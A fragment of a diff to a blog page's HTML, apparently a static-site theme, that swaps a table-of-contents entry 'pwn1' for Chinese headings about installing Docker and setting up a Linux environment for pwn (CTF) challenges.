-                linux系统调用表(system call table) <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -634,7 +675,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn1"><span class="nav-number">1.</span> <span class="nav-text">pwn1</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#正常的docker安装"><span class="nav-number">1.</span> <span class="nav-text">正常的docker安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux环境下pwn题的搭建"><span class="nav-number">2.</span> <span class="nav-text">linux环境下pwn题的搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#环境配置"><span class="nav-number">2.1.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用"><span class="nav-number">2.2.</span> <span class="nav-text">使用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#注："><span class="nav-number">2.2.1.</span> <span class="nav-text">注：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#删除docker"><span class="nav-number">3.</span> <span class="nav-text">删除docker</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#docker启动和停止"><span class="nav-number">4.</span> <span class="nav-text">docker启动和停止</span></a></li></ol></div>
             
 
           </div>
